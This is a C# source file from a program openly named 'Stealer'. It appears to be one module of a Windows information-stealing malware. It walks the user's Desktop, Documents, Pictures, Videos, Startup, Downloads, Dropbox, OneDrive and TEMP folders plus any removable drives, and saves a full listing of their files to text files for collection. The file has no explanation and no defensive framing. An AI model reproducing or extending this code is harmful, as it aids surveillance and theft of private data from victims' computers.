﻿using System;
using System.IO;
using System.Linq;
using System.Text;
using System.Collections.Generic;

namespace Stealer
{
    internal sealed class DirectoryTree
    {
        // Directories
        private static List<string> TargetDirs = new List<string>
        {
            Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
            Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments),
            Environment.GetFolderPath(Environment.SpecialFolder.MyPictures),
            Environment.GetFolderPath(Environment.SpecialFolder.MyVideos),
            Environment.GetFolderPath(Environment.SpecialFolder.Startup),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads"),
            Path.Combine(Environment.GetEnvironmentVariable("USERPROFILE"), "Dropbox"),
            Path.Combine(Environment.GetEnvironmentVariable("USERPROFILE"), "OneDrive"),
            Environment.GetEnvironmentVariable("TEMP")
        };

        // Get directories tree
        private static string GetDirectoryTree(string path, string indentation = "\t", int maxLevel = -1, int deep = 0)
        {
            if (!Directory.Exists(path)) return "Directory not exists";
            DirectoryInfo directory = new DirectoryInfo(path);
            StringBuilder builder = new StringBuilder();
            builder.AppendLine(string.Concat(Enumerable.Repeat(indentation, deep)) + directory.Name + "\\");
            if (maxLevel == -1 || maxLevel < deep)
            {
                try
                {
                    foreach (var subdirectory in directory.GetDirectories())
                        try
                        {
                            builder.Append(GetDirectoryTree(subdirectory.FullName, indentation, maxLevel, deep + 1));
                        }
                        catch (UnauthorizedAccessException) { continue; }
                } catch (UnauthorizedAccessException) { }
            }
            try
            {
                foreach (var file in directory.GetFiles())
                    builder.AppendLine(string.Concat(Enumerable.Repeat(indentation, deep + 1)) + file.Name);
            }
            catch (UnauthorizedAccessException) { }
            return builder.ToString();
        }

        // Get directory name
        private static string GetDirectoryName(string path)
        {
            string name = new DirectoryInfo(path).Name;
            if (name.Length == 3)
                return "DRIVE-" + name.Replace(":\\", "");

            return name;
        }

        // Save directories tree
        public static void SaveDirectories(string sSavePath)
        {
            // Add USB, CD drives to directory structure
            foreach (DriveInfo drive in DriveInfo.GetDrives())
                if (drive.DriveType == DriveType.Removable && drive.IsReady)
                    TargetDirs.Add(drive.RootDirectory.FullName);
            // Create tasks
            foreach (string path in TargetDirs)
            {
                try
                {
                    string results = GetDirectoryTree(path);
                    string dirname = GetDirectoryName(path);
                    if (!results.Contains("Directory not exists"))
                        File.WriteAllText(Path.Combine(sSavePath, dirname + ".txt"), results);
                }
                catch { }
            }
        }

    }
}
